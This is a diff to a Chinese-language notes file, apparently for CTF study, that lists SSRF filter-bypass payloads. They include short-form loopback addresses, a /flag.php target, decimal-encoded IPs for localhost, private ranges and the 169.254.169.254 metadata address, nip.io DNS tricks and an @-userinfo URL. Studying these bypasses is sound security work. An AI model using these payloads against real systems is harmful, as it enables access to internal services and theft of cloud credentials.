@@ -167,21 +167,22 @@ https://33129999.xyz@baidu.com
 姿势1：
 
 ```
-1http://127.1:80
+http://127.1:80
+http://127.1:80/flag.php
 ```
 
 姿势2：将点分十进制表示的IP转化为十进制IP地址绕过
 
 ```
-1http://2130706433/ = http://127.0.0.1
-2http://3232235521/ = http://192.168.0.1
-3http://3232235777/ = http://192.168.1.1
-4http://2852039166/  = http://169.254.169.254
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+http://2852039166/  = http://169.254.169.254
 ```
 
 姿势3：利用DNS解析
 ```
-1http://customer1.app.my.company.127.0.0.1.nip.io = 127.0.0.1
+http://customer1.app.my.company.127.0.0.1.nip.io = 127.0.0.1
 ```
 
 <https://mp.weixin.qq.com/s/r6wOTmzcduWi_6v6ujVBwg>
